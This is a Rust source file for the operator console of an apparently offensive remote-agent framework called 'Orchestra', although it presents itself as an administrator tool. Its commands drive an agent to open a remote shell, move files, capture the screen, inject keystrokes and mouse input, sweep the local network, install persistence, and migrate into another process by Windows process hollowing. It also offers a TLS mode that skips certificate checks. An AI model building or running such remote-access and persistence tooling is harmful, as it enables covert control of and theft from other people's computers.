//! Orchestra administrator console.
//!
//! Connects to a managed agent using either a TCP+pre-shared-key transport
//! (original / development mode) or a full mutual-TLS transport for
//! production deployments.

use anyhow::{Context, Result};
use base64::Engine;
use clap::{Parser, Subcommand};
use common::{
    tls_transport::TlsTransport, transport::TcpTransport, Command, CryptoSession, Message,
    Transport,
};
use std::io::{self, Read, Write};
use std::sync::Arc;
use tokio::net::TcpStream;

// ──────────────────────────── CLI definition ─────────────────────────────────

#[derive(Parser)]
#[clap(author, version, about = "Orchestra Administrator Console")]
struct Cli {
    /// Agent address in the form IP:PORT.
    #[clap(short, long)]
    target: String,

    /// Pre-shared AES-256 key (Base64-encoded). Required for both TCP and TLS transports.
    #[clap(short, long)]
    key: Option<String>,

    /// Use a mutual-TLS transport instead of the pre-shared-key TCP transport.
    #[clap(long)]
    tls: bool,

    /// PEM file containing the CA certificate that signed the agent's certificate.
    /// Required when --tls is active, unless --insecure is also passed.
    #[clap(long, requires = "tls")]
    ca_cert: Option<String>,

    /// PEM file containing the client certificate for mTLS authentication.
    #[clap(long, requires = "tls")]
    client_cert: Option<String>,

    /// PEM file containing the client private key for mTLS authentication.
    #[clap(long, requires = "tls")]
    client_key: Option<String>,

    /// Skip server-certificate verification.
    /// **INSECURE** — for development and testing only.
    #[clap(long, requires = "tls")]
    insecure: bool,

    /// TLS SNI hostname (defaults to the host portion of --target).
    #[clap(long, requires = "tls")]
    sni: Option<String>,

    #[clap(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Send a ping and print the response.
    Ping,
    /// Print system information from the agent.
    Info,
    /// Open an interactive shell session on the agent.
    Shell,
    /// Upload a local file to the agent.
    Upload {
        /// Local file to read.
        local: String,
        /// Path on the remote agent where the file should be written.
        remote: String,
    },
    /// Download a file from the agent to a local path.
    Download {
        /// Path on the remote agent to read.
        remote: String,
        /// Local path where the downloaded file is saved.
        local: String,
    },
    /// Deploy a capability module by name.
    Deploy { module_name: String },
    /// Tell the agent to reload its configuration file.
    ReloadConfig,
    /// Run an LAN/host network discovery sweep on the agent host.
    Discover,
    /// Capture a screenshot of the agent host's primary display.
    Screenshot {
        /// Local path to save the returned image (or returned payload).
        #[clap(long, default_value = "screenshot.png")]
        out: String,
    },
    /// Send a single key press, or run an interactive `key>` REPL when --repl is set.
    Key {
        /// One key to send. Required unless --repl is set.
        key: Option<String>,
        /// Read keys from stdin one per line until EOF.
        #[clap(long)]
        repl: bool,
    },
    /// Move the mouse to absolute coordinates, or open an interactive `x y` REPL.
    Mouse {
        x: Option<i32>,
        y: Option<i32>,
        /// Read coordinate pairs ("x y") from stdin until EOF.
        #[clap(long)]
        repl: bool,
    },
    /// Start the host's HCI Bluetooth research log buffer.
    HciStart,
    /// Stop the host's HCI log buffer.
    HciStop,
    /// Fetch the contents of the HCI log buffer.
    HciLog,
    /// Install the agent's persistence service.
    PersistEnable,
    /// Remove the agent's persistence service.
    PersistDisable,
    /// Snapshot the agent's process list as JSON.
    ListProcs,
    /// Migrate the agent into the address space of `pid` (Windows hollowing).
    Migrate { pid: u32 },
}

// ─────────────────────────── TLS helpers (rustls 0.23) ───────────────────────

/// A no-op certificate verifier that accepts any server certificate.
/// **Only use this for development; never in production.**
mod danger {
    use rustls::client::danger::{HandshakeSignatureValid, ServerCertVerified, ServerCertVerifier};
    use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
    use rustls::{DigitallySignedStruct, SignatureScheme};

    #[derive(Debug)]
    pub struct NoVerifier;

    impl ServerCertVerifier for NoVerifier {
        fn verify_server_cert(
            &self,
            _end_entity: &CertificateDer<'_>,
            _intermediates: &[CertificateDer<'_>],
            _server_name: &ServerName<'_>,
            _ocsp_response: &[u8],
            _now: UnixTime,
        ) -> Result<ServerCertVerified, rustls::Error> {
            Ok(ServerCertVerified::assertion())
        }

        fn verify_tls12_signature(
            &self,
            _message: &[u8],
            _cert: &CertificateDer<'_>,
            _dss: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, rustls::Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn verify_tls13_signature(
            &self,
            _message: &[u8],
            _cert: &CertificateDer<'_>,
            _dss: &DigitallySignedStruct,
        ) -> Result<HandshakeSignatureValid, rustls::Error> {
            Ok(HandshakeSignatureValid::assertion())
        }

        fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
            vec![
                SignatureScheme::RSA_PKCS1_SHA256,
                SignatureScheme::RSA_PKCS1_SHA384,
                SignatureScheme::RSA_PKCS1_SHA512,
                SignatureScheme::ECDSA_NISTP256_SHA256,
                SignatureScheme::ECDSA_NISTP384_SHA384,
                SignatureScheme::RSA_PSS_SHA256,
                SignatureScheme::RSA_PSS_SHA384,
                SignatureScheme::RSA_PSS_SHA512,
                SignatureScheme::ED25519,
            ]
        }
    }
}

fn load_pem_certs(path: &str) -> Result<Vec<rustls::pki_types::CertificateDer<'static>>> {
    let file = std::fs::File::open(path)
        .with_context(|| format!("Cannot open certificate file: {path}"))?;
    let mut reader = std::io::BufReader::new(file);
    rustls_pemfile::certs(&mut reader)
        .collect::<Result<Vec<_>, _>>()
        .with_context(|| format!("Failed to parse certificates from {path}"))
}

fn load_pem_key(path: &str) -> Result<rustls::pki_types::PrivateKeyDer<'static>> {
    let file =
        std::fs::File::open(path).with_context(|| format!("Cannot open key file: {path}"))?;
    let mut reader = std::io::BufReader::new(file);
    rustls_pemfile::private_key(&mut reader)
        .with_context(|| format!("Failed to parse private key from {path}"))?
        .ok_or_else(|| anyhow::anyhow!("No private key found in {path}"))
}

/// Build a TLS client config according to the CLI flags.
fn build_tls_config(cli: &Cli) -> Result<rustls::ClientConfig> {
    use rustls::ClientConfig;

    if cli.insecure {
        eprintln!(
            "WARNING: TLS certificate verification is disabled (--insecure). \
             Do not use this in production."
        );
        let config = ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(danger::NoVerifier))
            .with_no_client_auth();
        return Ok(config);
    }

    // Build root-cert store from the supplied CA file.
    let mut root_store = rustls::RootCertStore::empty();
    if let Some(ref ca_path) = cli.ca_cert {
        for cert in load_pem_certs(ca_path)? {
            root_store.add(cert)?;
        }
    }

    // Optionally add mTLS client authentication.
    if cli.client_cert.is_some() || cli.client_key.is_some() {
        let cert_path = cli
            .client_cert
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("--client-cert required for mTLS"))?;
        let key_path = cli
            .client_key
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("--client-key required for mTLS"))?;
        let certs = load_pem_certs(cert_path)?;
        let key = load_pem_key(key_path)?;
        Ok(ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_client_auth_cert(certs, key)?)
    } else {
        Ok(ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth())
    }
}

// ───────────────────────────────── main ──────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    // --- Build transport -------------------------------------------------------
    let mut transport: Box<dyn Transport + Send> = if cli.tls {
        let tls_cfg = build_tls_config(&cli)?;
        let connector = tokio_rustls::TlsConnector::from(Arc::new(tls_cfg));
        let stream = TcpStream::connect(&cli.target)
            .await
            .with_context(|| format!("Cannot connect to {}", cli.target))?;

        // Derive the SNI name from --sni or from the host part of --target.
        let host = cli.sni.clone().unwrap_or_else(|| {
            cli.target
                .split(':')
                .next()
                .unwrap_or("localhost")
                .to_string()
        });
        let sni = rustls::pki_types::ServerName::try_from(host)
            .map_err(|e| anyhow::anyhow!("Invalid SNI hostname: {e}"))?;

        let tls_stream = connector.connect(sni, stream).await?;
        let key_b64 = cli
            .key
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("--key is required to derive the application-layer session key"))?;
        let key_bytes = base64::engine::general_purpose::STANDARD
            .decode(key_b64)
            .context("--key is not valid Base64")?;
        let session = CryptoSession::from_shared_secret(&key_bytes);
        Box::new(TlsTransport::new(tls_stream, session))
    } else {
        let key_b64 = cli
            .key
            .as_deref()
            .ok_or_else(|| anyhow::anyhow!("Either --key or --tls must be provided"))?;
        let key_bytes = base64::engine::general_purpose::STANDARD
            .decode(key_b64)
            .context("--key is not valid Base64")?;
        let session = CryptoSession::from_shared_secret(&key_bytes);
        let stream = TcpStream::connect(&cli.target)
            .await
            .with_context(|| format!("Cannot connect to {}", cli.target))?;
        Box::new(TcpTransport::new(stream, session))
    };

    // --- Dispatch subcommand --------------------------------------------------
    let task_id = uuid::Uuid::new_v4().to_string();

    let command = match cli.command {
        Commands::Ping => Command::Ping,
        Commands::Info => Command::GetSystemInfo,
        Commands::Shell => {
            return handle_shell(&mut *transport).await;
        }
        Commands::Upload { local, remote } => {
            let content = std::fs::read(&local)
                .with_context(|| format!("Cannot read local file: {local}"))?;
            Command::WriteFile {
                path: remote,
                content,
            }
        }
        Commands::Download { remote, local } => {
            transport
                .send(Message::TaskRequest {
                    task_id: task_id.clone(),
                    command: Command::ReadFile { path: remote },
                    operator_id: None,
                })
                .await?;
            receive_response(&mut *transport, &local, true).await?;
            return Ok(());
        }
        Commands::Deploy { module_name } => Command::DeployModule {
            module_id: module_name,
        },
        Commands::ReloadConfig => Command::ReloadConfig,
        Commands::Discover => Command::DiscoverNetwork,
        Commands::Screenshot { out } => {
            transport
                .send(Message::TaskRequest {
                    task_id: task_id.clone(),
                    command: Command::CaptureScreen,
                    operator_id: None,
                })
                .await?;
            // Treat the response payload as base64-encoded image bytes.
            receive_response(&mut *transport, &out, true).await?;
            return Ok(());
        }
        Commands::Key { key, repl } => {
            if repl {
                return run_key_repl(&mut *transport).await;
            }
            let key =
                key.ok_or_else(|| anyhow::anyhow!("key argument required (or pass --repl)"))?;
            Command::SimulateKey { key }
        }
        Commands::Mouse { x, y, repl } => {
            if repl {
                return run_mouse_repl(&mut *transport).await;
            }
            let x = x.ok_or_else(|| anyhow::anyhow!("x coordinate required (or pass --repl)"))?;
            let y = y.ok_or_else(|| anyhow::anyhow!("y coordinate required (or pass --repl)"))?;
            Command::SimulateMouse { x, y }
        }
        Commands::HciStart => Command::StartHciLogging,
        Commands::HciStop => Command::StopHciLogging,
        Commands::HciLog => Command::GetHciLogBuffer,
        Commands::PersistEnable => Command::EnablePersistence,
        Commands::PersistDisable => Command::DisablePersistence,
        Commands::ListProcs => Command::ListProcesses,
        Commands::Migrate { pid } => Command::MigrateAgent { target_pid: pid },
    };

    transport
        .send(Message::TaskRequest {
            task_id,
            command,
            operator_id: None,
        })
        .await?;

    receive_response(&mut *transport, "", false).await
}

/// Drain messages until a `TaskResponse` arrives, writing any `AuditLog`
/// events to `audit.log` in JSON-lines format.
async fn receive_response(
    transport: &mut dyn Transport,
    download_dest: &str,
    is_download: bool,
) -> Result<()> {
    loop {
        match transport.recv().await? {
            Message::TaskResponse { result, .. } => {
                match result {
                    Ok(payload) if is_download => {
                        let bytes = base64::engine::general_purpose::STANDARD
                            .decode(&payload)
                            .context("Failed to decode file content")?;
                        std::fs::write(download_dest, &bytes)
                            .with_context(|| format!("Cannot write download to {download_dest}"))?;
                        println!("File saved to {download_dest}");
                    }
                    Ok(payload) => println!("{payload}"),
                    Err(e) => eprintln!("Error: {e}"),
                }
                return Ok(());
            }
            Message::AuditLog(event) => {
                write_audit_log(&event)?;
            }
            _ => {} // ignore heartbeats
        }
    }
}

fn write_audit_log(event: &common::AuditEvent) -> Result<()> {
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open("audit.log")
        .context("Cannot open audit.log")?;
    let line = serde_json::to_string(event).context("Failed to serialize audit event")?;
    writeln!(file, "{line}")?;
    Ok(())
}

async fn handle_shell(transport: &mut dyn Transport) -> Result<()> {
    let task_id = uuid::Uuid::new_v4().to_string();
    transport
        .send(Message::TaskRequest {
            task_id,
            command: Command::StartShell,
            operator_id: None,
        })
        .await?;

    let session_id = loop {
        match transport.recv().await? {
            Message::TaskResponse { result, .. } => {
                break result.map_err(|e| anyhow::anyhow!(e))?;
            }
            Message::AuditLog(ev) => write_audit_log(&ev)?,
            _ => {}
        }
    };

    let mut stdin = io::stdin();
    let mut stdout = io::stdout();
    let mut buf = [0u8; 1024];

    loop {
        match stdin.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                transport
                    .send(Message::TaskRequest {
                        task_id: uuid::Uuid::new_v4().to_string(),
                        command: Command::ShellInput {
                            session_id: session_id.clone(),
                            data: buf[..n].to_vec(),
                        },
                        operator_id: None,
                    })
                    .await?;
            }
            Err(_) => break,
        }

        transport
            .send(Message::TaskRequest {
                task_id: uuid::Uuid::new_v4().to_string(),
                command: Command::ShellOutput {
                    session_id: session_id.clone(),
                },
                operator_id: None,
            })
            .await?;

        loop {
            match transport.recv().await? {
                Message::TaskResponse { result, .. } => {
                    if let Ok(encoded) = result {
                        let bytes = base64::engine::general_purpose::STANDARD
                            .decode(&encoded)
                            .unwrap_or_default();
                        if !bytes.is_empty() {
                            stdout.write_all(&bytes)?;
                            stdout.flush()?;
                        }
                    }
                    break;
                }
                Message::AuditLog(ev) => write_audit_log(&ev)?,
                _ => {}
            }
        }

        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
    Ok(())
}

/// Read keys one per line from stdin and send each as a SimulateKey command.
/// Quits on EOF or on the literal line "quit".
async fn run_key_repl(transport: &mut dyn Transport) -> Result<()> {
    use std::io::BufRead;
    let stdin = std::io::stdin();
    let mut handle = stdin.lock();
    let mut line = String::new();
    println!("key> (one key per line, EOF or `quit` to exit)");
    loop {
        line.clear();
        let n = handle.read_line(&mut line)?;
        if n == 0 {
            break;
        }
        let key = line.trim().to_string();
        if key.is_empty() {
            continue;
        }
        if key == "quit" {
            break;
        }
        let task_id = uuid::Uuid::new_v4().to_string();
        transport
            .send(Message::TaskRequest {
                task_id,
                command: Command::SimulateKey { key },
                operator_id: None,
            })
            .await?;
        receive_response(transport, "", false).await?;
    }
    Ok(())
}

/// Read "x y" pairs one per line from stdin and send each as a SimulateMouse
/// command. Quits on EOF or on the literal line "quit".
async fn run_mouse_repl(transport: &mut dyn Transport) -> Result<()> {
    use std::io::BufRead;
    let stdin = std::io::stdin();
    let mut handle = stdin.lock();
    let mut line = String::new();
    println!("mouse> (one `x y` pair per line, EOF or `quit` to exit)");
    loop {
        line.clear();
        let n = handle.read_line(&mut line)?;
        if n == 0 {
            break;
        }
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        if trimmed == "quit" {
            break;
        }
        let mut parts = trimmed.split_whitespace();
        let x: i32 = match parts.next().and_then(|s| s.parse().ok()) {
            Some(v) => v,
            None => {
                eprintln!("expected `x y`, got `{trimmed}`");
                continue;
            }
        };
        let y: i32 = match parts.next().and_then(|s| s.parse().ok()) {
            Some(v) => v,
            None => {
                eprintln!("expected `x y`, got `{trimmed}`");
                continue;
            }
        };
        let task_id = uuid::Uuid::new_v4().to_string();
        transport
            .send(Message::TaskRequest {
                task_id,
                command: Command::SimulateMouse { x, y },
                operator_id: None,
            })
            .await?;
        receive_response(transport, "", false).await?;
    }
    Ok(())
}
